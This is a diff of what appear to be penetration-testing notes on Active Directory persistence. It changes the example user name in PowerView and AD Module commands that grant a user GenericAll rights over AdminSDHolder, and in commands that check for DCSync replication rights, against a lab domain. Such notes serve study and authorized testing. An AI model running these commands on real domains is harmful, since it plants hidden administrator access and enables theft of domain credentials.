@@ -353,9 +353,9 @@ misc::skeleton
 
 •  Add FullControl permissions ("GenericAll" rights) for an arbitrary user to AdminSDHolder 
 
-```Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName Josh -Rights All -Verbose``` - PowerView
+```Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName Mary -Rights All -Verbose``` - PowerView
 
-```Set-ADACL -DistinguishedName 'CN=AdminSDHolder,CN=System,DC=bcorp,DC=ecorp,DC=lab' -Principal Josh -Verbose``` - AD Module
+```Set-ADACL -DistinguishedName 'CN=AdminSDHolder,CN=System,DC=bcorp,DC=ecorp,DC=lab' -Principal Mary -Verbose``` - AD Module
 
 #### Domain Replication Privileges 
 •  Add DCSync rights ("Replicating Directory Changes*" (x3) permissions) - https://adsecurity.org/?p=1729) for an arbitrary user 
@@ -370,12 +370,12 @@ NOT WORKING!!
 
 try:
 ```
-Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs | Where-Object { $_.IdentityReference -match 'Josh' }
+Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs | Where-Object { $_.IdentityReference -match 'Mary' }
 ```
 
 DCSync (not working): 
 
-```Get-DomainObjectAcl -DistinguishedName "dc=bcorp,dc=ecorp,dc=lab" -ResolveGUIDs | ? {($_.IdentityReference -match "Josh") -and (($_.ObjectType -match 'replication') -or ($_.ActiveDirectoryRights -match 'GenericAll'))}```
+```Get-DomainObjectAcl -DistinguishedName "dc=bcorp,dc=ecorp,dc=lab" -ResolveGUIDs | ? {($_.IdentityReference -match "Mary") -and (($_.ObjectType -match 'replication') -or ($_.ActiveDirectoryRights -match 'GenericAll'))}```
 
 Note:  ```Where-Object```  ==  ``` ? ```
 
